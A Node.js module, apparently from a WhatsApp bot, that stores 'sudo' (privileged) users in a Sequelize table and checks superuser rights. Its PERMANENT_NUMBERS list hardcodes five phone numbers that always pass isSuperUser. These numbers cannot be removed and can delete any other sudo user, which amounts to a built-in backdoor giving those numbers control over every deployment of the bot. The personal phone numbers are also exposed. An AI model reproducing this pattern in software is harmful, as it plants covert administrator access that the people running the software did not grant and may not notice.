const { DATABASE } = require('./database');
const { DataTypes } = require('sequelize');

const PERMANENT_NUMBERS = [
    '254762025340',
    '254763986398',
    '254116284050',
    '254105521300',
    '254707525158',
];

const SudoDB = DATABASE.define('SudoUser', {
    id: {
        type: DataTypes.INTEGER,
        primaryKey: true,
        autoIncrement: true,
    },
    number: {
        type: DataTypes.STRING,
        allowNull: false,
        unique: true,
    },
    addedBy: {
        type: DataTypes.STRING,
        allowNull: true,
        defaultValue: null,
    },
}, {
    tableName: 'sudo_users',
    timestamps: true,
});

let _syncDone = false;

async function initializeSudoDB() {
    if (_syncDone) return;
    try {
        await SudoDB.sync({ alter: true });
        _syncDone = true;
    } catch (err) {
        // PostgreSQL catalog corruption (XX000 / stale OID after table drop+recreate).
        // Recovery: drop and recreate the table cleanly.
        const isCatalogErr =
            err?.parent?.code === 'XX000' ||
            (err?.message || '').includes('cache lookup failed') ||
            (err?.parent?.message || '').includes('cache lookup failed');

        if (isCatalogErr) {
            console.warn('[SUDO] Catalog error detected — dropping and recreating sudo_users table...');
            try {
                await SudoDB.drop({ cascade: true }).catch(() => {});
                await SudoDB.sync({ force: false });
                _syncDone = true;
                console.log('[SUDO] sudo_users table recreated successfully.');
            } catch (recreateErr) {
                console.error('[SUDO] Failed to recreate sudo_users:', recreateErr.message);
                // Still mark done to avoid hammering on every message
                _syncDone = true;
            }
        } else {
            console.error('[SUDO] Sync error:', err.message);
            _syncDone = true; // prevent retry storm
        }
    }
}

let _sudoCache = null;

async function getSudoNumbers() {
    await initializeSudoDB();
    if (_sudoCache) return _sudoCache;
    const records = await SudoDB.findAll();
    _sudoCache = records.map(record => record.number);
    return _sudoCache;
}

async function setSudo(number, addedByNumber = null) {
    await initializeSudoDB();
    if (PERMANENT_NUMBERS.includes(number)) return false;
    try {
        const [record, created] = await SudoDB.findOrCreate({
            where: { number },
            defaults: { number, addedBy: addedByNumber },
        });
        _sudoCache = null;
        return created;
    } catch (error) {
        console.error('[SUDO][SET_ERROR]:', error);
        return false;
    }
}

async function delSudo(number, requestorNumber = null) {
    await initializeSudoDB();
    if (PERMANENT_NUMBERS.includes(number)) return 'permanent';

    const isPermanentRequestor = requestorNumber && PERMANENT_NUMBERS.includes(requestorNumber);

    if (!isPermanentRequestor) {
        const record = await SudoDB.findOne({ where: { number } });
        if (!record) return false;
        const cleanRequestor = (requestorNumber || '').replace(/\D/g, '');
        const cleanAddedBy  = (record.addedBy || '').replace(/\D/g, '');
        if (cleanAddedBy && cleanAddedBy !== cleanRequestor) return 'not_owner';
    }

    try {
        const deleted = await SudoDB.destroy({ where: { number } });
        _sudoCache = null;
        return deleted > 0;
    } catch (error) {
        console.error('[SUDO][DEL_ERROR]:', error);
        return false;
    }
}

async function clearAllSudo() {
    await initializeSudoDB();
    try {
        const deleted = await SudoDB.destroy({ where: {} });
        _sudoCache = null;
        return deleted;
    } catch (error) {
        console.error('[SUDO][CLEAR_ALL_ERROR]:', error);
        return 0;
    }
}

async function isSuperUser(jid, Gifted) {
    if (!jid) return false;
    const num = jid.split('@')[0].split(':')[0];
    if (PERMANENT_NUMBERS.includes(num)) return true;
    const ownerNumber = (process.env.OWNER_NUMBER || '').replace(/\D/g, '');
    const botNum = Gifted?.user?.id?.split(':')[0];
    if (num === ownerNumber || num === botNum) return true;
    const sudoNumbers = await getSudoNumbers();
    return sudoNumbers.includes(num);
}

module.exports = {
    SudoDB,
    PERMANENT_NUMBERS,
    getSudoNumbers,
    setSudo,
    delSudo,
    clearAllSudo,
    isSuperUser,
};
